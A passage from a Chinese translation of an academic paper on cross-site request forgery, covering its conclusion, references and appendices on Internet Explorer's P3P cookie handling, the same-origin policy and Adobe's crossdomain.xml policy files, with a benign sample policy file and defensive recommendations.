我们的客户端浏览器插件似乎是Adobe自己的Flash程序之外的Adobe跨域策略的第一个实现。可以做更多的工作，看看是否在其他情况下认真采用这一政策会增加用户保护和网站的灵活性。

#### 7结论

CSRF攻击对于诊断，利用和修复相对简单。网站可以在几秒钟内分析;攻击可以在几分钟内完成。对于这些攻击盛行的最合理的解释是，网络开发人员不知道这个问题，或者（错误地）认为针对更为人所知的crosssite脚本攻击的防御措施也能够抵御CSRF攻击。我们希望我们提出的攻击显示出危险 的CSRF攻击，并帮助Web开发人员给予他们应得的关注。 一旦Web开发者意识到CSRF攻击，他们就可以使用我们创建的工具来保护自己。

我们建议框架的创建者将CSRF保护添加到他们的框架中，从而保护在此框架之上构建的任何网站。在框架级别添加CSRF保护，使开发人员无需复制代码，甚至可以详细了解CSRF攻击（尽管推荐理解这些攻击）。在每个站点都受到CSRF攻击保护之前，用户可以采取措施使用我们的Firefox浏览器插件来保护自己。也可以为其他浏览器编写类似的插件。

CSRF和类似漏洞的根本原因可能在于当今Web协议的复杂性，以及Web从数据表示设备逐渐演变为交互式服务平台。随着越来越多的功能被添加到浏览器客户端，并且越来越多的网站涉及复杂的编程和客户端 - 服务器交互服务，CSRF和相关攻击将变得更加普遍，除非采取防御措施。随着网络技术的复杂性不断提高，我们可以期待更多新的攻击类别出现。

#### 参考文献
[1] 关于Metafilter。http://www.metafilter.com/about.mefi.

[2] 允许跨域数据加载。
http://livedocs.adobe.com/flash/9.0/main/wwhelp/wwhimpl/common/html/wwhelp.htm?context=LiveDocs_Parts&file=00001085.html.

[3] Catalyst.  
http://www.catalystframework.org/.

[4] Code Igniter.  
http://www.codeigniter.com/.

[5] django.   
http://www.djangoproject.com/.

[6] Metafilter: Lost Password?  
http://www.metafilter.com/login/lostpassword.mefi.

[7] Internet Explorer 6中的隐私权。  
http://msdn2.microsoft.com/en-us/library/ms537343.aspx.

[8] Ruby on Rails.  
http://www.rubyonrails.org.

[9] Struts.   
http://struts.apache.org/.

[10] 纽约时报：媒体资料包2007。  
http://www.nytimes.whsites.net/mediakit/pages/d_aud_target.html.

[11] 同源政策。  
http://livedocs.adobe.com/flash/9.0/main/wwhelp/wwhimpl/common/html/wwhelp.htm.

[12] 网络安全威胁分类。  
http://www.webappsec.org/projects/threat/.

[13] YouTube简介。  
http://www.youtube.com/t/fact_sheet.

[14] Ellacoya数据显示，网络流量是网络上带宽最大的对等网络（Peer-to-Peer，P2P）。  
http://www.ellacoya.com/news/pdf/2007/NXTcommEllacoyaMediaAlert.pdf ,Jun 2006.

[15] ING新闻稿。  
http://www.rsa.com/press_release.aspx?id=7220 , Aug 2006.

[16] Alexa热门网站。  
http://www.alexa.com/site/sales , Sep 2007.

[17] A.Barth，C.Jackson和J.C.Mitchell。强大的防御跨站点请求伪造。CCS,2008年。
 
[18] A. Bortz和D. Boneh。通过计时Web应用程序暴露私人信息。在WWW'07：第16届万维网国际会议论文集，第621-628页，纽约，纽约，美国，2007年。ACM出版社。

[19] J. Burns. 跨站点参考伪造：介绍常见的Web应用程序的弱点。  
http://www.isecpartners.com/documents/XSRF_Paper.pdf , 2005.

[20] D.Endler。跨站点脚本攻击的演变。  
http://cgisecurity.com/lib/XSS.pdf , May 2002.

[21] R. Fielding，J. Gettys，J. Mogul，H. Frystyk，L. Masinter，P。 Leach和T. Berners-Lee。超文本传输协议 - HTTP / 1.1,1999。

[22] J.Franks，P.Hallam-Baker，J.Hostetler，S。 Lawrence，P. Leach，A. Luotonen和L. Stewart.HTTP认证：基本和摘要访问认证，1999。

[23] J. Grossman. CSRF，沉睡的巨人。  
http://jeremiahgrossman.blogspot.com/2006/09/csrf-sleeping-giant.html ,Sep 2006.

[24] M. Johns和J. Winter。 RequestRodeo：针对会话骑乘的客户端保护。在2006年欧洲OWASP会议论文集编辑F. Piessens的论文中，CW448的报告是第5-17页，Levven大学，Katholieke Universiteit 2006年5月。

[25] M. Johns和J. Winter。保护内部网免受“JavaScript恶意软件”和相关攻击。DIMVA，2007年。

[26] N. Jovanovic，E. Kirda和C. Kruegel。防止跨站请求伪造攻击。 Securecomm和Workshops，2006年，第1-10页，2006年8月28日 - 2006年9月1日。

[27] T. Schreiber。 会话叠置：当今Web应用程序中普遍存在的漏洞。 http://www.securenet.de/papers/Session_Riding.pdf , 2004.

[28] C. Shiflett. 安全角：跨站请求伪造。   
http://shiflett.org/articles/cross-site-requestforgeries ,Dec 2004.

[29] C. Shiflett. crossdomain.xml巫婆狩猎  
http://shiflett.org/blog/2006/oct/the-crossdomain.xml-witch-hunt , Oct 2006.

[30] C. Shiflett. Flash与跨域Ajax的危害。  
http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domainajax-with-flash , Sep 2006.


#### A  Internet Explorer和CSRF

可以使用Cookie来跟踪多个网站上的用户。例如，假设广告客户在自己的服务器上托管了大量发布商网站包含的图像（广告）。当图片被显示时，广告商可以设置cookie，这将允许广告商在访问不同的发布者站点时识别单个用户。也就是说，当用户浏览发布者网站并加载广告客户的图片时，他的cookie将被发回给广告客户并被唯一标识。广告商可以使用这些cookies来编辑关于用户的浏览习惯的数据。

关注cookies对用户隐私的这种不利影响导致了隐私偏好平台（P3P）的创建。P3P“提供了一种通用的语法和传输机制，使网站能够将其隐私惯例传达给Internet Explorer 6（或任何其他用户代理）”[7]。从Internet Explorer 6开始，Microsoft要求所有站点都包含P3P策略，以便接收第三方Cookie。

据微软称：
> 高级cookie过滤是通过评估网站的隐私惯例，并根据站点的紧凑策略和用户自己的喜好来决定哪些cookie是可接受的。默认设置中，cookie用于收集个人身份信息，不允许用户在他们的使用选择被认为是“不满意”。默认情况下，当浏览会话结束并在第三方上下文中被拒绝时，第一方上下文中不满意的cookie被删除[7]。

 （请注意，P3P政策未经验证，如果网站声称拥有可接受的政策，则Internet Explorer允许使用第三方Cookie。）

假设用户位于一个页面，这个页面包含了在第三方网站上的图像。在P3P的情况下，第三方网站在用户所在的页面被认为是安全的时候可能是危险的。对于CSRF漏洞，情况正好相反，用户所在的页面可能是危险的，而第三方站点被认为是安全的（并且是潜在的攻击目标）。当Internet Explorer认为第三方网站有危险时，它会阻止Cookie被发送到该网站。当使用“会话cookie”时，这将有效地防止CSRF攻击，因为Internet Explorer正在剥离来自跨站点请求的身份验证信息。

Internet Explorer的P3P策略对CSRF漏洞有一个有趣的影响。对于CSRF攻击（Internet Explorer认为这些网站安全且允许Cookie），具有有效P3P策略的站点不受保护，而没有策略的站点受到保护（Internet Explorer认为这些站点不安全并阻止Cookie）。请注意，这仅适用于CSRF影响使用Cookie进行身份验证的网站的漏洞。使用其他类型身份验证的站点可能仍然容易受到CSRF攻击。

总而言之，当使用“会话cookie”身份验证和目标站点不实施P3P策略时，Internet Explorer对P3P的使用会导致IE的用户受到CSRF攻击的保护。这种“保护”是P3P政策的一个意外后果，不应该只用于防止CSRF攻击。相反，站点应该实现我们的服务器端建议，如4.1节所述。


#### B 同源政策

网页浏览器有一项艰巨的任务，允许用户维护与多个网站的安全的私人连接，同时允许访问包含不可信的代码的不受信任的网站。另外，网站能够加载来自不同域的资源。例如，网站`a.com`可以分别使用\<img\>或\<script\>标签从`b.com`加载图片或JavaScript。但是，如果用户登录到受信任的站点，不受信任的第三方显然应该无法读取受信任站点的内容。希望允许不受信任的站点显示来自外部站点的数据，同时仍然保持这些数据的隐私导致了同源策略的创建[11]。这个策略同时定义了访问不同来源的数据时的“来源”和网站的能力。政策认为“如果协议，端口（如果给定）和主机是相同的两个页面是相同的页面“[11]。根据同源策略，站点无法读取或修改不同来源的资源，但它可以向不同来源发送资源请求。因此，虽然evil.com可以使用\<img\>标签将`http://trusted.com/image.gif`包含在其网站中，但它无法读取该图像的像素数据。同样，虽然`evil.com`可以使用\<iframe\>标签在其网站中包含 `http://trusted.com/private.htm` ，但它无法访问或修改浏览器显示的页面内容。

同源策略只能防止第三方站点从其他站点读取数据，并不妨碍这些第三方站点发送请求。由于CSRF攻击是由请求发送引起的（导致在服务器端执行一些操作），相同的原始策略不会阻止CSRF攻击。 相反，它只能保护第三方网站上的数据的隐私。

网站有时会发现跨不同域名进行沟通是有用的或必要的。 Adobe提出了一种称为跨域策略的机制[2]，它允许其Flash插件在某些情况下与不同的域进行通信（发送和接收数据）。 这个机制目前只被Flash使用。 具体而言，一个网站可以指定哪些第三方网站可以访问它。 如果受信任的站点在其跨域策略文件中列出了第三方站点，则第三方站点只能联系受信任的站点。 以下示例跨域策略文件允许访问源自 `www.friendlysite.com`，`* .trusted.com` 和IP地址 `64.233.167.99 `的请求。 这些文件被命名为`crossdomain.xml`并放置在域的根目录下。



```
<?xml version="1.0"?>
<cross-domain-policy>
<allow-access-from
domain="www.friendlysite.com" />
<allow-access-from domain="*.trusted.com" />
<allow-access-from domain="64.233.167.99" />
</cross-domain-policy>
```


假设上面的文件位于 `http://trusted.com/crossdomain.xml` 。如果一个请求是由`evil.com`使用Flash进行的`http://trusted.com/private.htm`，Flash将首先加载`http：/ /trusted.com/crossdomain.xml`来验证`evil.com`是否被列为受信任的域。 由于它不在列表中，请求将被阻止。 另一方面，Flash会允许来自`www.friendlysite.com`的相同请求，因为它存在于允许的域名列表中。

如果使用得当，Adobe的跨域策略允许针对CSRF攻击提供比同源策略更多的保护（除非找到匹配的`crossdomain.xml`，否则请求甚至无法启动），并且具有更大的灵活性（如果目标站点信任发起站点）。 但是，跨网域政策经常使用不当，目标网站提供“接受全部”条款。 这允许来自任何站点的第三方访问，无论是恶性的还是良性的。`crossdomain.xml`文件的这种不正确和非常危险的用法，甚至会被Adobe的附属网站(8) `crossdomainxml.org`延续下去。本网站提供了一个“接受所有”跨域策略文件的示例，绝对没有解释使用此策略文件所涉及的危险。 有关使用这种跨域策略文件的危险的更多信息，请参阅Chris Shiflett（[30]和[29]）。

> (8) 域名crossdomainxml.org注册给PowerSDK Software Corp的Theodore E Patrick，他声称自己是LinkedIn系统中的“Adobe Systems Flex的技术推广者”（http://www.linkedin.com/in/tedpatrick）

我们分析了500个顶级网站[16]，发现了143个使用 `crossdomain.xml`策略文件。在这143个站点中，47个站点接受来自第三方站点的所有连接，可能导致CSRF漏洞。

如果小心使用，Adobe的跨域策略可能是有效和安全的。 但是，必须小心解释“接受所有”解决方案的危险。


